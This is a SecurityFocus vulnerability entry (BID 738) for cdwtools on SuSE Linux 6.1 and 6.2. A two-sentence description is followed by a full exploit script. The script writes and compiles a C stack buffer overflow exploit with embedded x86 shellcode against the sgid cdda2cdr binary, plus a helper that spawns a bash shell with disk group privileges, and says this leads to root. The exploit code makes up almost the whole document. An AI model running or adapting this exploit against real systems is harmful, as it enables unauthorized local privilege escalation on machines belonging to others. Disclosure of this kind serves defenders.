source: http://www.securityfocus.com/bid/738/info

cdwtools is a package of utilities for cd-writing. The linux version of these utilities, which ships with S.u.S.E linux 6.1 and 6.2, is vulnerable to several local root compromises. It is known that there are a number of ways to exploit these packages, including buffer overflows and /tmp symlink attacks. 

--- cdda2x.sh ---
#! /bin/sh
#
# Shell script for Linux x86 cdda2cdr exploit
# Brock Tellier btellier@usa.net
#

cat > /tmp/cdda2x.c <<EOF

/**
 ** Linux x86 exploit for /usr/bin/cdda2cdr (sgid disk on some Linux distros)

 ** gcc -o cdda2x cdda2x.c; cdda2x <offset> <bufsiz>
 ** 
 ** Brock Tellier btellier@usa.net 
 **/


#include <stdlib.h>
#include <stdio.h>

char exec[]= /* Generic Linux x86 running our /tmp program */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/tmp/cd";



#define LEN 500
#define NOP 0x90

unsigned long get_sp(void) {

__asm__("movl %esp, %eax");

}


void main(int argc, char *argv[]) {

int offset=0;
int i;
int buflen = LEN;
long int addr;
char buf[LEN];

 if(argc > 3) {
  fprintf(stderr, "Error: Usage: %s offset buffer\n", argv[0]);
 exit(0);
 }
 else if (argc == 2){
   offset=atoi(argv[1]);

 }
 else if (argc == 3) {
   offset=atoi(argv[1]);
   buflen=atoi(argv[2]);

 }
 else {
   offset=500;
   buflen=500;

 }


addr=get_sp();

fprintf(stderr, "Linux x86 cdda2cdr local disk exploit\n");
fprintf(stderr, "Brock Tellier btellier@usa.net\n");
fprintf(stderr, "Using addr: 0x%x\n", addr+offset);

memset(buf,NOP,buflen);
memcpy(buf+(buflen/2),exec,strlen(exec));
for(i=((buflen/2) + strlen(exec))+1;i<buflen-4;i+=4)
 *(int *)&buf[i]=addr+offset;

execl("/usr/bin/cdda2cdr", "cdda2cdr", "-D", buf, NULL);


/*
for (i=0; i < strlen(buf); i++) putchar(buf[i]);
*/

}

EOF

cat > /tmp/cd.c <<EOF
void main() { 
    setregid(getegid(), getegid());
    system("/bin/bash");
}
EOF

gcc -o /tmp/cd /tmp/cd.c
gcc -o /tmp/cdda2x /tmp/cdda2x.c
echo "Note that gid=6 leads to easy root access.."
/tmp/cdda2x